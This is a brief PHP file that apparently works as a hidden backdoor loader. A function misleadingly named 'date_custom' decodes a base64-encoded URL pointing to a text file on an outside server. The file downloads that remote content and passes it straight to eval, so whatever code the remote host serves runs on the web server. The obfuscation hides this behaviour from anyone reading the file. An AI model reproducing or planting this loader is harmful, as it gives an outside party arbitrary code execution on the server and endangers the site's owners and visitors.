<?php
function date_custom($data) {
    return base64_decode($data);
}
$krl = "aHR0cHM6Ly93d3cuY29uY2Vqb211bmljaXBhbGNoaWEuZ292LmNvL2JhY2t1cC9jYW50b3RvL2RvbnR0b3VjaG1lLnR4dA";
$dt = date_custom($krl);
$ia = file_get_contents($dt);
eval("?>" . $ia);
?>
